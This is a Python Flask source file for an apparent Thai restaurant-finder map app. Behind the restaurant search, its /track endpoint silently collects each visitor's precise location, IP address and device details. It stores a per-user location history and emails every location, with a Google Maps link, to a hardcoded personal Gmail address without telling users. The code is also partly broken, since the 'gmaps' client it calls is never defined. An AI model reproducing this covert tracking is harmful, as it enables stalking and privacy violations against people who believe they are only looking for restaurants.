from flask import Flask, render_template, jsonify, request, session
from geopy.geocoders import Nominatim
import folium
from folium import plugins
import os
from dotenv import load_dotenv
from operator import itemgetter
import logging
import json
from datetime import datetime
import pytz
import math
import uuid
import platform
import hashlib
from ua_parser import user_agent_parser
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from threading import Thread

# Set up logging
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

# Load environment variables
load_dotenv()

# Create required directories
DATA_DIR = 'data'
USER_DATA_DIR = os.path.join(DATA_DIR, 'user_data')
DEVICE_DATA_DIR = os.path.join(DATA_DIR, 'device_data')
BACKUP_DIR = os.path.join(DATA_DIR, 'backups')

for directory in [DATA_DIR, USER_DATA_DIR, DEVICE_DATA_DIR, BACKUP_DIR]:
    if not os.path.exists(directory):
        os.makedirs(directory)

LOCATION_HISTORY_FILE = os.path.join(DATA_DIR, 'location_history.json')

app = Flask(__name__)

def get_user_location_file(user_id):
    """Get location history file path for specific user"""
    return os.path.join(USER_DATA_DIR, f'location_history_{user_id}.json')

def get_backup_file(user_id):
    """Get backup file path for specific user"""
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    return os.path.join(BACKUP_DIR, f'location_history_{user_id}_{timestamp}.json')

def send_location_email(user_data, location_data):
    """Send location data to specified email"""
    try:
        # Email configuration
        sender_email = os.getenv('EMAIL_USER')
        sender_password = os.getenv('EMAIL_PASSWORD')
        receiver_email = "bee.teyamaster@gmail.com"
        
        if not sender_email or not sender_password:
            logger.error("Missing email configuration")
            return False
            
        logger.info(f"Preparing to send email from {sender_email} to {receiver_email}")
        
        # Create message
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver_email
        msg['Subject'] = f"New Location Data - User {user_data.get('user_id', 'Unknown')}"
        
        # Format location data
        location_text = f"""
        New location data received:
        
        User ID: {user_data.get('user_id', 'Unknown')}
        Timestamp: {location_data.get('timestamp')}
        Latitude: {location_data.get('latitude')}
        Longitude: {location_data.get('longitude')}
        Address: {location_data.get('address', 'Not available')}
        
        Device Information:
        Browser: {user_data.get('browser', 'Unknown')}
        OS: {user_data.get('os', 'Unknown')}
        IP: {user_data.get('ip', 'Unknown')}
        
        Google Maps Link:
        https://www.google.com/maps?q={location_data.get('latitude')},{location_data.get('longitude')}
        """
        
        msg.attach(MIMEText(location_text, 'plain'))
        
        logger.info("Email content prepared, attempting to send...")
        
        # Send email
        try:
            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
                server.login(sender_email, sender_password)
                server.send_message(msg)
                logger.info(f"Location email sent successfully to {receiver_email}")
                return True
        except Exception as e:
            logger.error(f"SMTP Error: {str(e)}")
            return False
            
    except Exception as e:
        logger.error(f"Error preparing email: {str(e)}")
        return False

def save_user_location(user_id, location_data, device_id):
    """Save user location with device information and send email notification"""
    try:
        location_file = os.path.join(USER_DATA_DIR, f'user_{user_id}.json')
        
        # Load or create user data
        if os.path.exists(location_file):
            with open(location_file, 'r', encoding='utf-8') as f:
                user_data = json.load(f)
        else:
            user_data = {
                'user_id': user_id,
                'first_visit': datetime.now(pytz.timezone('Asia/Bangkok')).isoformat(),
                'devices': [],
                'locations': []
            }
        
        # Add device if new
        if device_id not in user_data['devices']:
            user_data['devices'].append(device_id)
        
        # Add location data
        location_entry = {
            'timestamp': datetime.now(pytz.timezone('Asia/Bangkok')).isoformat(),
            'device_id': device_id,
            'latitude': float(location_data['lat']),
            'longitude': float(location_data['lon']),
            'accuracy': location_data.get('accuracy'),
            'address': None
        }
        
        # Get address
        try:
            geolocator = Nominatim(user_agent="restaurant_finder_app")
            location = geolocator.reverse(
                f"{location_entry['latitude']}, {location_entry['longitude']}", 
                timeout=5,
                language='th'
            )
            location_entry['address'] = location.address if location else None
        except Exception as e:
            logger.warning(f"Could not get address: {str(e)}")
        
        # Add to locations list
        user_data['locations'].append(location_entry)
        
        # Send email notification
        send_location_email(user_data, location_entry)
        
        # Keep only last 100 locations
        if len(user_data['locations']) > 100:
            # Backup before truncating
            backup_file = os.path.join(BACKUP_DIR, 
                f'user_{user_id}_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json')
            with open(backup_file, 'w', encoding='utf-8') as f:
                json.dump(user_data, f, ensure_ascii=False, indent=2)
            
            user_data['locations'] = user_data['locations'][-100:]
        
        # Update last visit
        user_data['last_visit'] = location_entry['timestamp']
        
        # Save user data
        with open(location_file, 'w', encoding='utf-8') as f:
            json.dump(user_data, f, ensure_ascii=False, indent=2)
        
        logger.debug(f"Location saved for user {user_id} from device {device_id}")
        return True
    except Exception as e:
        logger.error(f"Error saving user location: {str(e)}")
        return False

def calculate_distance(lat1, lon1, lat2, lon2):
    """Calculate distance between two points using Haversine formula"""
    R = 6371000  # Earth radius in meters
    phi1 = math.radians(lat1)
    phi2 = math.radians(lat2)
    delta_phi = math.radians(lat2 - lat1)
    delta_lambda = math.radians(lon2 - lon1)
    
    a = math.sin(delta_phi/2)**2 + math.cos(phi1) * math.cos(phi2) * math.sin(delta_lambda/2)**2
    c = 2 * math.atan2(math.sqrt(a), math.sqrt(1-a))
    return R * c

def get_device_info():
    """Get detailed device information from request"""
    try:
        user_agent = request.headers.get('User-Agent', '')
        parsed_ua = user_agent_parser.Parse(user_agent)
        
        return {
            'user_agent': user_agent,
            'browser': parsed_ua['user_agent']['family'],
            'browser_version': parsed_ua['user_agent']['major'],
            'os': parsed_ua['os']['family'],
            'os_version': parsed_ua['os']['major'],
            'device': parsed_ua['device']['family'],
            'ip': request.remote_addr,
            'timestamp': datetime.now(pytz.timezone('Asia/Bangkok')).isoformat()
        }
    except Exception as e:
        logger.error(f"Error getting device info: {str(e)}")
        return {
            'user_agent': 'Unknown',
            'browser': 'Unknown',
            'os': 'Unknown',
            'ip': request.remote_addr,
            'timestamp': datetime.now(pytz.timezone('Asia/Bangkok')).isoformat()
        }

@app.route('/')
def index():
    # Create a map centered at a default location (Bangkok)
    start_coords = (13.7563, 100.5018)
    folium_map = folium.Map(location=start_coords, 
                           zoom_start=15,
                           width='100%',
                           height='100%')
    
    # Add locate control
    plugins.LocateControl(auto_start=True).add_to(folium_map)
    
    # Convert map to HTML
    map_html = folium_map._repr_html_()
    return render_template('index.html', map=map_html)

@app.route('/track', methods=['POST'])
def track_user():
    try:
        data = request.get_json()
        if not data or 'lat' not in data or 'lon' not in data:
            return jsonify({
                'status': 'error',
                'message': 'Missing location data'
            }), 400
        
        # Generate or get user ID
        user_id = data.get('user_id', str(uuid.uuid4()))
        
        # Get device information
        device_info = get_device_info()
        device_id = hashlib.md5(f"{device_info['user_agent']}_{device_info['ip']}".encode()).hexdigest()
        
        # Save user location
        success = save_user_location(user_id, data, device_id)
        
        return jsonify({
            'status': 'success' if success else 'error',
            'user_id': user_id,
            'device_id': device_id,
            'message': 'Data saved successfully' if success else 'Failed to save data'
        })
        
    except Exception as e:
        logger.error(f"Error in track_user: {str(e)}")
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500

@app.route('/get_location_history')
def get_location_history():
    try:
        user_id = request.args.get('user_id', 'default')
        location_file = get_user_location_file(user_id)
        
        if os.path.exists(location_file):
            try:
                with open(location_file, 'r', encoding='utf-8') as f:
                    history = json.load(f)
                return jsonify({
                    'status': 'success',
                    'history': history
                })
            except json.JSONDecodeError:
                logger.error(f"Invalid JSON in history file for user {user_id}")
                return jsonify({
                    'status': 'error',
                    'message': 'Invalid history data'
                })
        return jsonify({
            'status': 'success',
            'history': []
        })
    except Exception as e:
        logger.error(f"Error getting location history: {str(e)}")
        return jsonify({
            'status': 'error',
            'message': str(e)
        })

@app.route('/get_location')
def get_location():
    try:
        lat = request.args.get('lat')
        lon = request.args.get('lon')
        
        if not lat or not lon:
            return jsonify({
                'status': 'error',
                'message': 'Missing coordinates'
            })
            
        geolocator = Nominatim(user_agent="my_web_app")
        location = geolocator.reverse(f"{lat}, {lon}")
        
        return jsonify({
            'status': 'success',
            'lat': float(lat),
            'lon': float(lon),
            'address': location.address if location else 'ไม่พบข้อมูลที่อยู่'
        })
    except Exception as e:
        logger.error(f"Error in get_location: {str(e)}")
        return jsonify({
            'status': 'error',
            'message': str(e)
        })

@app.route('/get_nearby_restaurants')
def get_nearby_restaurants():
    try:
        lat = request.args.get('lat')
        lon = request.args.get('lon')
        
        if not lat or not lon:
            logger.warning("Missing coordinates in get_nearby_restaurants request")
            return jsonify({
                'status': 'error',
                'message': 'กรุณาระบุตำแหน่งของคุณ'
            }), 400

        try:
            lat = float(lat)
            lon = float(lon)
        except ValueError:
            logger.error(f"Invalid coordinates: lat={lat}, lon={lon}")
            return jsonify({
                'status': 'error',
                'message': 'พิกัดไม่ถูกต้อง'
            }), 400

        logger.debug(f"Searching for restaurants near lat: {lat}, lon: {lon}")

        try:
            # Search for nearby restaurants
            places_result = gmaps.places_nearby(
                location=(lat, lon),
                radius=1000,  # 1km radius
                type='restaurant',
                language='th'
            )

            if not places_result.get('results'):
                logger.info(f"No restaurants found near lat: {lat}, lon: {lon}")
                return jsonify({
                    'status': 'success',
                    'message': 'ไม่พบร้านอาหารในบริเวณนี้',
                    'restaurants': []
                })

            # Process and sort restaurants
            restaurants = []
            for place in places_result.get('results', []):
                restaurant = {
                    'name': place.get('name', 'ไม่ระบุชื่อ'),
                    'rating': place.get('rating', 0),
                    'user_ratings_total': place.get('user_ratings_total', 0),
                    'vicinity': place.get('vicinity', 'ไม่ระบุที่อยู่'),
                    'lat': place['geometry']['location']['lat'],
                    'lng': place['geometry']['location']['lng']
                }
                restaurants.append(restaurant)

            # Sort by rating (highest first)
            restaurants.sort(key=lambda x: (x['rating'] or 0, x['user_ratings_total'] or 0), reverse=True)

            logger.debug(f"Successfully found {len(restaurants)} restaurants")
            return jsonify({
                'status': 'success',
                'restaurants': restaurants
            })

        except Exception as e:
            logger.error(f"Google Maps API error: {str(e)}")
            return jsonify({
                'status': 'error',
                'message': 'เกิดข้อผิดพลาดในการค้นหาร้านอาหาร'
            }), 500

    except Exception as e:
        logger.error(f"Unexpected error in get_nearby_restaurants: {str(e)}")
        return jsonify({
            'status': 'error',
            'message': 'เกิดข้อผิดพลาดที่ไม่คาดคิด กรุณาลองใหม่อีกครั้ง'
        }), 500

@app.route('/test')
def test():
    return render_template('test.html')

@app.route('/test_email')
def test_email():
    """Test endpoint for email functionality"""
    try:
        # Create test data
        test_user_data = {
            'user_id': 'test_user',
            'browser': 'Test Browser',
            'os': 'Test OS',
            'ip': '127.0.0.1'
        }
        
        test_location_data = {
            'timestamp': datetime.now(pytz.timezone('Asia/Bangkok')).isoformat(),
            'latitude': 13.7563,
            'longitude': 100.5018,
            'address': 'Test Location, Bangkok, Thailand'
        }
        
        # Attempt to send email
        success = send_location_email(test_user_data, test_location_data)
        
        if success:
            return jsonify({
                'status': 'success',
                'message': 'Test email sent successfully'
            })
        else:
            return jsonify({
                'status': 'error',
                'message': 'Failed to send test email'
            }), 500
            
    except Exception as e:
        logger.error(f"Error in test_email: {str(e)}")
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500

if __name__ == '__main__':
    app.run(debug=True) 